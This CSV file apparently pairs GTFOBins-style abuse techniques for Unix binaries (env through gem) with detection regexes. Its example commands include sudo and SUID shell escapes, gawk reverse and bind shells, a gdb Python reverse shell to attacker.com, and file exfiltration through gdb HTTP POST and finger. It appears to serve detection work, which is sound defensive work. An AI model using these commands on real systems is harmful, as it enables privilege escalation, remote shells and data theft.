Name,Function,ExampleCode,Regex,Notes
env,suid,./env /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?env\s*\-p\s+(?:/bin/(?:sh|bash))),
env,sudo,sudo env /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?env\s+(?:/bin/(?:sh|bash))),
eqn,file-read,"eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,suid,"./eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
eqn,sudo,"sudo eqn ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?eqn\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,file-read,"espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,suid,"./espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
espeak,sudo,"sudo espeak -qXf ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?espeak\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,shell,"ex
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
ex,file-write,"ex file_to_write
a
DATA
.
w
q","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ex,file-read,"ex file_to_read
,p
q",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+.+),
ex,sudo,"sudo ex
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ex\s+(?:/bin/(?:sh|bash))),
exiftool,file-read,"exiftool -filename=$OUTPUT $LFILE
cat $OUTPUT","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,file-write,exiftool -filename=$LFILE $INPUT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
exiftool,sudo,sudo exiftool -filename=$LFILE $INPUT,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?exiftool\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,file-read,"expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,suid,"./expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expand,sudo,"sudo expand ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expand\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
expect,file-read,expect $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files."
expect,shell,expect -c 'spawn /bin/sh;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
expect,suid,./expect -c 'spawn /bin/sh -p;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s*\-p\s+(?:/bin/(?:sh|bash))),
expect,sudo,sudo expect -c 'spawn /bin/sh;interact',(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?expect\s*\-c\s+(?:/bin/(?:sh|bash))),
facter,shell,"echo 'exec(""/bin/sh"")' > $TF/x.rb
FACTERLIB=$TF facter","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
facter,sudo,"echo 'exec(""/bin/sh"")' > $TF/x.rb
sudo FACTERLIB=$TF facter","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?facter\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
file,file-read,file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
file,file-read,file -m $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-m\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.

If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.

It can also be provided with a directory and will read each file in the directory.
"
file,suid,./file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
file,sudo,sudo file -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?file\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files."
find,shell,find . -exec /bin/sh \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,suid,./find . -exec /bin/sh -p \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s*\-p\s+(?:/bin/(?:sh|bash))),
find,sudo,sudo find . -exec /bin/sh \; -quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:/bin/(?:sh|bash))),
find,file-write,"find / -fprintf ""$FILE"" DATA -quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?find\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","DATA is a format string, it supports some escape sequences."
finger,file-upload,"finger ""$(base64 $LFILE)@$RHOST""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?finger\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
finger,file-download,"finger x@$RHOST | base64 -d > ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?finger\s*\-d\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | sudo nc -l -p 79` on the attacker box to send the file."
fish,shell,fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,suid,./fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
fish,sudo,sudo fish,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fish\s+.+),
flock,shell,flock -u / /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
flock,suid,./flock -u / /bin/sh -p,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s*\-p\s+(?:/bin/(?:sh|bash))),
flock,sudo,sudo flock -u / /bin/sh,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?flock\s*\-u\s+(?:/bin/(?:sh|bash))),
fmt,file-read,"fmt -pNON_EXISTING_PREFIX ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This only works for the GNU version of `fmt`.
fmt,file-read,"fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fmt,suid,"./fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fmt,sudo,"sudo fmt -999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fmt\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This corrupts the output by wrapping very long lines at the given width.
fold,file-read,"fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,suid,"./fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fold,sudo,"sudo fold -w99999999 ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fold\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,file-read,fping -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
fping,sudo,sudo fping -f $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?fping\s*\-f\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
ftp,shell,"ftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
ftp,file-upload,"ftp $RHOST
put file_to_send","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Send local file to a FTP server.
ftp,file-download,"ftp $RHOST
get file_to_get","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Fetch a remote file from a FTP server.
ftp,sudo,"sudo ftp
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?ftp\s+(?:/bin/(?:sh|bash))),
gawk,shell,"gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,non-interactive-reverse-shell,"gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc -l -p 12345` on the attacker box to receive the shell.
gawk,non-interactive-bind-shell,"gawk -v LPORT=$LPORT 'BEGIN {
s = ""/inet/tcp/"" LPORT ""/0/0"";
while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:\bprintf\b).*(?:\bgetline\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",Run `nc target.com 12345` on the attacker box to connect to the shell.
gawk,file-write,"gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s*\-v\s+(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,file-read,"gawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,suid,"./gawk '//' ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,sudo,"sudo gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gawk,limited-suid,"./gawk 'BEGIN {system(""/bin/sh"")}'","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gawk\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:\bBEGIN\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc -x c -E ""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s*\-x\s*\-E\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,file-read,"gcc @""$LFILE""","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data."
gcc,file-write,gcc -xc /dev/null -o $LFILE,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s*\-o\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcc,shell,"gcc -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcc,sudo,"sudo gcc -wrapper /bin/sh,-s .",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcc\s+(?:/bin/(?:sh|bash))),
gcloud,shell,"gcloud help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
gcloud,sudo,"sudo gcloud help
!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcloud\s+(?:/bin/(?:sh|bash))),"This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
gcore,file-read,gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,sudo,sudo gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gcore,suid,./gcore $PID,"(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gcore\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",
gdb,shell,gdb -nx -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,reverse-shell,"export RHOST=attacker.com
export RPORT=12345
gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket()
s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT""))))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn(""/bin/sh"")' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:getenv\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\)).*(?:/bin/(?:sh|bash)).*(?:\bsocket\b|\bfsockopen\b|\bconnect\b).*(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that GDB is compiled with Python support. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell."
gdb,file-upload,"export URL=http://attacker.com/
export LFILE=file_to_send
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u
else: import urllib as u, urllib2 as r
r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))","This requires that GDB is compiled with Python support. Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file."
gdb,file-upload,"export LPORT=8888
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import http.server as s, socketserver as ss
else: import SimpleHTTPServer as s, SocketServer as ss
ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support. Serve files in the local folder running an HTTP server.
gdb,file-download,"export URL=http://attacker.com/file_to_get
export LFILE=file_to_save
gdb -nx -ex 'python import sys; from os import environ as e
if sys.version_info.major == 3: import urllib.request as r
else: import urllib as r
r.urlretrieve(e[""URL""], e[""LFILE""])' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support. Fetch a remote file via HTTP GET request.
gdb,file-write,"gdb -nx -ex ""dump value $LFILE \""DATA\"""" -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support.
gdb,file-read,"gdb -nx -ex 'python print(open(""file_to_read"").read())' -ex quit","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This requires that GDB is compiled with Python support.
gdb,library-load,"gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),This requires that GDB is compiled with Python support.
gdb,suid,"./gdb -nx -ex 'python import os; os.execl(""/bin/sh"", ""sh"", ""-p"")' -ex quit",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:/bin/(?:sh|bash)).*(?:\bimport\b)),This requires that GDB is compiled with Python support.
gdb,sudo,sudo gdb -nx -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+.+),
gdb,capabilities,./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit,(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gdb\s+(?:\bimport\b)),This requires that GDB is compiled with Python support.
gem,shell,"gem open -e ""/bin/sh -c /bin/sh"" rdoc",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-e\s*\-c\s+(?:/bin/(?:sh|bash))),This requires the name of an installed gem to be provided (`rdoc` is usually installed).
gem,shell,"gem open rdoc
:!/bin/sh",(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s+(?:/bin/(?:sh|bash))),"This invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply. This requires the name of an installed gem to be provided (`rdoc` is usually installed)."
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem build $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
gem,shell,"echo 'system(""/bin/sh"")' > $TF/x
gem install --file $TF/x","(?i)(?:(?i)(?:sudo\s+)?(?:\S*/)?gem\s*\-\-file\s+(?:system|exec|shell_exec|popen|passthru|pcntl_exec)\s*\(\s*(?:(?:""[^""]+""|\'[^\']+\')|(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:[A-Za-z0-9_\-./:]+))\s*\).*(?:/bin/(?:sh|bash)).*(?:(?:\$[A-Za-z_][A-Za-z0-9_]*|\$\{[A-Za-z_][A-Za-z0-9_]*\})|(?:""[^""]+""|\'[^\']+\')))",This executes the specified file as [`ruby`](/gtfobins/ruby/) code.
